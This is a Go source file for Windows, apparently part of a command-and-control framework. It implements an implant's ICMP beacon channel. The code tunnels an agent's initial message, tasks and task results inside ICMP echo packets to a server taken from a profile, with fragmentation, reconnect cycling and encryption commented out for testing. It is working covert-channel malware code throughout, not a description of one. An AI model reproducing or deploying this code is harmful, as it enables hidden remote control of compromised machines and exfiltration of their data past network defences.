// +build windows

package main

import (
	"encoding/binary"
	"gopher/utils"
	"syscall"
	"time"
	"unsafe"

	"github.com/vmihailenco/msgpack/v5"
)

// ICMP协议常量 - ICMP protocol constants
const (
	CUSTOM_HEADER_SIZE = 16
	TYPE_BEACON_DATA   = 0
	TYPE_REQUEST_REPLY = 1
	TYPE_ACK           = 2
	TYPE_TASK          = 3

	FRAGMENTED = 0x00000001
	FIRST_FRAG = 0x00000010
	LAST_FRAG  = 0x00000100
	FETCH_FRAG = 0x00001000
)

// ICMPHeader 自定义ICMP协议头
type ICMPHeader struct {
	Type          uint32
	Identifier    uint32
	Flags         uint32
	FragmentIndex uint32
}

// Windows ICMP API 结构
type IcmpEchoReply struct {
	Address       uint32
	Status        uint32
	RoundTripTime uint32
	DataSize      uint16
	Reserved      uint16
	Data          uintptr
	Options       uintptr
}

var (
	iphlpapi          = syscall.NewLazyDLL("iphlpapi.dll")
	ws2_32            = syscall.NewLazyDLL("ws2_32.dll")
	icmpCreateFile    = iphlpapi.NewProc("IcmpCreateFile")
	icmpSendEcho      = iphlpapi.NewProc("IcmpSendEcho")
	icmpCloseHandle   = iphlpapi.NewProc("IcmpCloseHandle")
	inet_addr         = ws2_32.NewProc("inet_addr")
)

// ICMPConnection ICMP连接结构
type ICMPConnection struct {
	handle          syscall.Handle
	serverAddr      uint32
	identifier      uint32
	maxFragmentSize int
}

// NewICMPConnection 创建新的ICMP连接
func NewICMPConnection(serverAddr string, identifier uint32, maxFragmentSize int) (*ICMPConnection, error) {
	// 创建ICMP句柄
	ret, _, err := icmpCreateFile.Call()
	if ret == 0 || ret == uintptr(syscall.InvalidHandle) {
		return nil, err
	}

	// 转换IP地址
	addrBytes := append([]byte(serverAddr), 0)
	addrRet, _, _ := inet_addr.Call(uintptr(unsafe.Pointer(&addrBytes[0])))

	return &ICMPConnection{
		handle:          syscall.Handle(ret),
		serverAddr:      uint32(addrRet),
		identifier:      identifier,
		maxFragmentSize: maxFragmentSize,
	}, nil
}

// Close 关闭连接
func (ic *ICMPConnection) Close() error {
	if ic.handle != syscall.InvalidHandle {
		icmpCloseHandle.Call(uintptr(ic.handle))
		ic.handle = syscall.InvalidHandle
	}
	return nil
}

// SendData 发送数据（带分片支持）
func (ic *ICMPConnection) SendData(data []byte) error {
	maxPayload := ic.maxFragmentSize - CUSTOM_HEADER_SIZE

	if len(data) <= maxPayload {
		// 单包发送
		_, err := ic.sendPacket(TYPE_BEACON_DATA, 0, 0, data)
		return err
	}

	// 需要分片
	totalFrags := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalFrags; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}

		var flags uint32 = FRAGMENTED
		if i == 0 {
			flags |= FIRST_FRAG
		}
		if i == totalFrags-1 {
			flags |= LAST_FRAG
		}

		_, err := ic.sendPacket(TYPE_BEACON_DATA, flags, uint32(i), data[start:end])
		if err != nil {
			return err
		}
	}

	return nil
}

// RequestResponse 请求并接收响应
func (ic *ICMPConnection) RequestResponse() ([]byte, error) {
	// 发送请求
	return ic.sendPacket(TYPE_REQUEST_REPLY, 0, 0, nil)
}

// sendPacket 发送单个ICMP包并接收响应
func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex uint32, payload []byte) ([]byte, error) {
	// 构建自定义协议头
	header := make([]byte, CUSTOM_HEADER_SIZE)
	binary.LittleEndian.PutUint32(header[0:4], packetType)
	binary.LittleEndian.PutUint32(header[4:8], ic.identifier)
	binary.LittleEndian.PutUint32(header[8:12], flags)
	binary.LittleEndian.PutUint32(header[12:16], fragIndex)

	sendData := append(header, payload...)

	// 准备接收缓冲区
	replySize := uint32(unsafe.Sizeof(IcmpEchoReply{})) + 65535
	replyBuf := make([]byte, replySize)

	// 发送ICMP Echo请求
	ret, _, err := icmpSendEcho.Call(
		uintptr(ic.handle),
		uintptr(ic.serverAddr),
		uintptr(unsafe.Pointer(&sendData[0])),
		uintptr(len(sendData)),
		0,
		uintptr(unsafe.Pointer(&replyBuf[0])),
		uintptr(replySize),
		uintptr(5000), // 5秒超时
	)

	if ret == 0 {
		return nil, err
	}

	// 解析响应
	reply := (*IcmpEchoReply)(unsafe.Pointer(&replyBuf[0]))
	if reply.Status != 0 {
		return nil, nil
	}

	if reply.DataSize < CUSTOM_HEADER_SIZE {
		return nil, nil
	}

	// 获取响应数据
	replyData := make([]byte, reply.DataSize)
	for i := uint16(0); i < reply.DataSize; i++ {
		replyData[i] = *(*byte)(unsafe.Pointer(reply.Data + uintptr(i)))
	}

	respHeader := parseHeader(replyData[:CUSTOM_HEADER_SIZE])

	// 如果是ACK包，返回nil
	if respHeader.Type == TYPE_ACK {
		return nil, nil
	}

	// 如果是TASK包，返回数据
	if respHeader.Type == TYPE_TASK {
		return replyData[CUSTOM_HEADER_SIZE:], nil
	}

	return nil, nil
}

// parseHeader 解析协议头
func parseHeader(data []byte) ICMPHeader {
	return ICMPHeader{
		Type:          binary.LittleEndian.Uint32(data[0:4]),
		Identifier:    binary.LittleEndian.Uint32(data[4:8]),
		Flags:         binary.LittleEndian.Uint32(data[8:12]),
		FragmentIndex: binary.LittleEndian.Uint32(data[12:16]),
	}
}

// RunICMPLoop ICMP通信主循环
func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
	addrIndex := 0

	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(profile.Addresses)
		}

		// 创建ICMP连接
		icmpConn, err := NewICMPConnection(profile.Addresses[addrIndex], agentId, profile.MaxFragmentSize)
		if err != nil {
			continue
		}

		// 发送初始化消息
		err = icmpConn.SendData(initMsg)
		if err != nil {
			icmpConn.Close()
			continue
		}

		i = 0 // 重置重连计数

		// 通信循环
		for ACTIVE {
			// 请求任务
			recvData, err := icmpConn.RequestResponse()
			if err != nil {
				break
			}

			if len(recvData) == 0 {
				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
				continue
			}

			var inMessage utils.Message

			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
			// TODO: Encryption disabled for testing, enable after functionality test passes
			/*
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}
			*/

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			outMessage := utils.Message{Type: 0}
			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ := msgpack.Marshal(outMessage)
			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
			// TODO: Encryption disabled for testing, enable after functionality test passes
			// sendData, _ = utils.EncryptData(sendData, sessionKey)

			err = icmpConn.SendData(sendData)
			if err != nil {
				break
			}
		}

		icmpConn.Close()
	}
}
